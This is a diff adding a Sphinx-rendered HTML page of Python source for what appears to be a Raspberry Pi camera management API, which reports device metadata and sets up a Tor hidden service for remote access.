+        <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&quot;/etc/hostname&quot;</span><span class="p">,</span> <span class="s2">&quot;r&quot;</span><span class="p">)</span> <span class="k">as</span> <span class="n">fn</span><span class="p">:</span>
+            <span class="n">hn</span> <span class="o">=</span> <span class="n">fn</span><span class="o">.</span><span class="n">readlines</span><span class="p">()[</span><span class="mi">0</span><span class="p">]</span>
+        <span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_DGRAM</span><span class="p">)</span>
+        <span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="s2">&quot;8.8.8.8&quot;</span><span class="p">,</span> <span class="mi">0</span><span class="p">))</span>
+        <span class="n">jsondata</span><span class="p">[</span><span class="s1">&#39;internal_ip&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">getsockname</span><span class="p">()[</span><span class="mi">0</span><span class="p">]</span>
+
+        <span class="n">metadatas</span> <span class="o">=</span> <span class="p">{}</span>
+        <span class="n">metadatas_from_cameras_fn</span> <span class="o">=</span> <span class="n">glob</span><span class="p">(</span><span class="s2">&quot;*.json&quot;</span><span class="p">)</span>
+        <span class="k">for</span> <span class="n">fn</span> <span class="ow">in</span> <span class="n">metadatas_from_cameras_fn</span><span class="p">:</span>
+            <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">fn</span><span class="p">,</span> <span class="s1">&#39;r&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+                <span class="n">metadatas</span><span class="p">[</span><span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">splitext</span><span class="p">(</span><span class="n">fn</span><span class="p">)[</span><span class="mi">0</span><span class="p">]]</span> <span class="o">=</span> <span class="n">json</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">())</span>
+        <span class="n">jsondata</span><span class="p">[</span><span class="s1">&#39;metadata&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="n">metadatas</span>
+
+        <span class="n">a_statvfs</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">statvfs</span><span class="p">(</span><span class="s2">&quot;/&quot;</span><span class="p">)</span>
+        <span class="n">free_space</span> <span class="o">=</span> <span class="n">a_statvfs</span><span class="o">.</span><span class="n">f_frsize</span> <span class="o">*</span> <span class="n">a_statvfs</span><span class="o">.</span><span class="n">f_bavail</span>
+        <span class="n">total_space</span> <span class="o">=</span> <span class="n">a_statvfs</span><span class="o">.</span><span class="n">f_frsize</span> <span class="o">*</span> <span class="n">a_statvfs</span><span class="o">.</span><span class="n">f_blocks</span>
+        <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">2</span><span class="p">):</span>
+            <span class="n">free_space</span> <span class="o">/=</span> <span class="mf">1024.0</span>
+            <span class="n">total_space</span> <span class="o">/=</span> <span class="mf">1024.0</span>
+        <span class="n">jsondata</span><span class="p">[</span><span class="s1">&#39;free_space_mb&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="n">free_space</span>
+        <span class="n">jsondata</span><span class="p">[</span><span class="s1">&#39;total_space_mb&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="n">total_space</span>
+        <span class="n">jsondata</span><span class="p">[</span><span class="s2">&quot;name&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="n">hn</span>
+
+        <span class="n">rpiconfig</span> <span class="o">=</span> <span class="n">ConfigParser</span><span class="p">()</span>
+        <span class="n">rpiconfig</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="s2">&quot;picam.ini&quot;</span><span class="p">)</span>
+        <span class="n">configs</span> <span class="o">=</span> <span class="p">{}</span>
+        <span class="k">for</span> <span class="n">file</span> <span class="ow">in</span> <span class="n">glob</span><span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="s2">&quot;configs_byserial&quot;</span><span class="p">,</span> <span class="s2">&quot;*.ini&quot;</span><span class="p">)):</span>
+            <span class="n">configs</span><span class="p">[</span><span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">basename</span><span class="p">(</span><span class="n">file</span><span class="p">)[:</span><span class="o">-</span><span class="mi">4</span><span class="p">]]</span> <span class="o">=</span> <span class="n">ConfigParser</span><span class="p">()</span>
+            <span class="n">configs</span><span class="p">[</span><span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">basename</span><span class="p">(</span><span class="n">file</span><span class="p">)[:</span><span class="o">-</span><span class="mi">4</span><span class="p">]]</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="n">file</span><span class="p">)</span>
+        <span class="n">jsondata</span><span class="p">[</span><span class="s1">&#39;cameras&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="p">{}</span>
+        <span class="k">for</span> <span class="n">serial</span><span class="p">,</span> <span class="n">cam_config</span> <span class="ow">in</span> <span class="n">configs</span><span class="o">.</span><span class="n">items</span><span class="p">():</span>
+            <span class="n">conf</span> <span class="o">=</span> <span class="p">{}</span>
+            <span class="k">for</span> <span class="n">section</span> <span class="ow">in</span> <span class="n">cam_config</span><span class="o">.</span><span class="n">sections</span><span class="p">():</span>
+                <span class="k">if</span> <span class="ow">not</span> <span class="n">section</span> <span class="o">==</span> <span class="s2">&quot;formatter_logfileformatter&quot;</span> <span class="ow">and</span> <span class="ow">not</span> <span class="n">section</span> <span class="o">==</span> <span class="s2">&quot;formatter_simpleFormatter&quot;</span><span class="p">:</span>
+                    <span class="n">conf</span><span class="p">[</span><span class="n">section</span><span class="p">]</span> <span class="o">=</span> <span class="nb">dict</span><span class="p">(</span><span class="n">cam_config</span><span class="o">.</span><span class="n">items</span><span class="p">(</span><span class="n">section</span><span class="p">))</span>
+            <span class="n">jsondata</span><span class="p">[</span><span class="s1">&#39;cameras&#39;</span><span class="p">][</span><span class="n">serial</span><span class="p">]</span> <span class="o">=</span> <span class="n">conf</span>
+        <span class="n">rpc</span> <span class="o">=</span> <span class="p">{}</span>
+        <span class="k">for</span> <span class="n">section</span> <span class="ow">in</span> <span class="n">rpiconfig</span><span class="o">.</span><span class="n">sections</span><span class="p">():</span>
+            <span class="k">if</span> <span class="ow">not</span> <span class="n">section</span> <span class="o">==</span> <span class="s2">&quot;formatter_logfileformatter&quot;</span> <span class="ow">and</span> <span class="ow">not</span> <span class="n">section</span> <span class="o">==</span> <span class="s2">&quot;formatter_simpleFormatter&quot;</span><span class="p">:</span>
+                <span class="n">rpc</span><span class="p">[</span><span class="n">section</span><span class="p">]</span> <span class="o">=</span> <span class="nb">dict</span><span class="p">(</span><span class="n">rpiconfig</span><span class="o">.</span><span class="n">items</span><span class="p">(</span><span class="n">section</span><span class="p">))</span>
+
+        <span class="k">try</span><span class="p">:</span>
+            <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&quot;/etc/machine-id&quot;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+                <span class="n">ser</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">())</span>
+                <span class="n">ser</span> <span class="o">=</span> <span class="n">ser</span><span class="o">.</span><span class="n">strip</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
+                <span class="n">jsondata</span><span class="p">[</span><span class="s1">&#39;cameras&#39;</span><span class="p">][</span><span class="n">ser</span><span class="p">]</span> <span class="o">=</span> <span class="n">rpc</span>
+        <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+            <span class="n">jsondata</span><span class="p">[</span><span class="s1">&#39;cameras&#39;</span><span class="p">][</span><span class="s1">&#39;picam&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="n">rpc</span>
+            <span class="n">jsondata</span><span class="p">[</span><span class="s1">&#39;cameras&#39;</span><span class="p">][</span><span class="s1">&#39;picam&#39;</span><span class="p">][</span><span class="s1">&#39;error&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="n">e</span><span class="p">)</span>
+        <span class="k">return</span> <span class="nb">str</span><span class="p">(</span><span class="n">json</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">jsondata</span><span class="p">))</span>
+    <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+        <span class="k">return</span> <span class="nb">str</span><span class="p">(</span><span class="n">e</span><span class="p">)</span></div>
+
+
+<div class="viewcode-block" id="get_version"><a class="viewcode-back" href="../api.html#api.get_version">[docs]</a><span class="k">def</span> <span class="nf">get_version</span><span class="p">():</span>
+    <span class="n">subprocess</span><span class="o">.</span><span class="n">check_output</span><span class="p">([</span><span class="s2">&quot;/usr/bin/git describe --always&quot;</span><span class="p">],</span> <span class="n">shell</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span></div>
+
+
+<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s2">&quot;__main__&quot;</span><span class="p">:</span>
+    <span class="k">try</span><span class="p">:</span>
+        <span class="c1"># generate a new machine id if one does not already exist</span>
+        <span class="n">new_torrc</span> <span class="o">=</span> <span class="s2">&quot;&quot;&quot;Log notice syslog</span>
+<span class="s2">                    DataDirectory /var/lib/tor</span>
+<span class="s2">                    HiddenServiceDir /home/tor_private/</span>
+<span class="s2">                    HiddenServicePort 80 127.0.0.1:5000</span>
+<span class="s2">                    HiddenServicePort 666 127.0.0.1:666</span>
+<span class="s2">                    HiddenServiceAuthorizeClient basic bvz&quot;&quot;&quot;</span>
+        <span class="n">new_torrc</span> <span class="o">=</span> <span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">q</span><span class="o">.</span><span class="n">lstrip</span><span class="p">(</span><span class="s2">&quot;                &quot;</span><span class="p">)</span> <span class="k">for</span> <span class="n">q</span> <span class="ow">in</span> <span class="n">new_torrc</span><span class="o">.</span><span class="n">splitlines</span><span class="p">())</span>
+
+        <span class="n">restart_tor</span> <span class="o">=</span> <span class="kc">False</span>
+
+        <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;/etc/tor/torrc&#39;</span><span class="p">,</span> <span class="s1">&#39;r&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">torrc</span><span class="p">:</span>
+            <span class="k">if</span> <span class="n">torrc</span><span class="o">.</span><span class="n">read</span><span class="p">()</span> <span class="o">!=</span> <span class="n">new_torrc</span><span class="p">:</span>
+                <span class="n">restart_tor</span> <span class="o">=</span> <span class="kc">True</span>
+
+        <span class="c1"># with open(&#39;/etc/tor/torrc&#39;, &#39;w&#39;) as torrc:</span>
+        <span class="c1">#     torrc.write(torrc)</span>
+
+        <span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s2">&quot;chown -R tor:tor /home/tor_private &quot;</span><span class="p">)</span>
+        <span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s2">&quot;chown -R tor:tor /var/lib/tor&quot;</span><span class="p">)</span>
+
+        <span class="k">if</span> <span class="n">restart_tor</span><span class="p">:</span>
+            <span class="n">systemctl</span><span class="p">(</span><span class="s2">&quot;restart tor.service&quot;</span><span class="p">)</span>
+
+        <span class="k">if</span> <span class="ow">not</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">exists</span><span class="p">(</span><span class="s2">&quot;/etc/machine-id&quot;</span><span class="p">):</span>
+            <span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s2">&quot;systemd-machine-id-setup&quot;</span><span class="p">)</span>
+    <span class="k">except</span><span class="p">:</span>
+        <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;something went wrong, oh well...&quot;</span><span class="p">)</span>
+
+    <span class="n">app</span><span class="o">.</span><span class="n">run</span><span class="p">(</span><span class="n">host</span><span class="o">=</span><span class="s1">&#39;0.0.0.0&#39;</span><span class="p">,</span> <span class="n">port</span><span class="o">=</span><span class="mi">666</span><span class="p">)</span>
+</pre></div>
+
+          </div>
+        </div>
+      </div>
+      <div class="sphinxsidebar" role="navigation" aria-label="main navigation">
+        <div class="sphinxsidebarwrapper"><div class="relations">
+<h3>Related Topics</h3>
+<ul>
+  <li><a href="../index.html">Documentation overview</a><ul>
+  <li><a href="index.html">Module code</a><ul>
+  </ul></li>
+  </ul></li>
+</ul>
+</div>
+<div id="searchbox" style="display: none" role="search">
+  <h3>Quick search</h3>
+    <form class="search" action="../search.html" method="get">
+      <div><input type="text" name="q" /></div>
+      <div><input type="submit" value="Go" /></div>
+      <input type="hidden" name="check_keywords" value="yes" />
+      <input type="hidden" name="area" value="default" />
+    </form>
+</div>
+<script type="text/javascript">$('#searchbox').show(0);</script>
+        </div>
+      </div>
+      <div class="clearer"></div>
+    </div>
+    <div class="footer">
+      &copy;2016, Gareth Dunstone, Kevin Murray, Tim Brown.
+      
+      |
+      Powered by <a href="http://sphinx-doc.org/">Sphinx 1.5</a>
+      &amp; <a href="https://github.com/bitprophet/alabaster">Alabaster 0.7.9</a>
+      
+    </div>
+
+    
+
+    
+  </body>
+</html>
